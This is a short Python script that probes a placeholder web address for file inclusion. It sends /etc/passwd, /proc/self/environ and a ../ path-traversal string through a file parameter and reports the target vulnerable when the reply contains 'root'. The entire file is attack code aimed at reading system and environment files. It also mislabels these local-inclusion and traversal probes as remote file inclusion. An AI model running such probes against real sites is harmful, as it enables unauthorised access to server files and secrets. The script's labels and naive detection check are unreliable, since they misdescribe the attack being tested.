import requests

# list of files to check for RFI
files = ["/etc/passwd", "/proc/self/environ", "../../../../../../../etc/passwd"]

# target URL
url = "http://example.com/index.php?file="

for file in files:
    rfi_url = url + file
    response = requests.get(rfi_url)
    if "root" in response.text:
        print(rfi_url + " is vulnerable to RFI!")
    else:
        print(rfi_url + " is not vulnerable to RFI.")
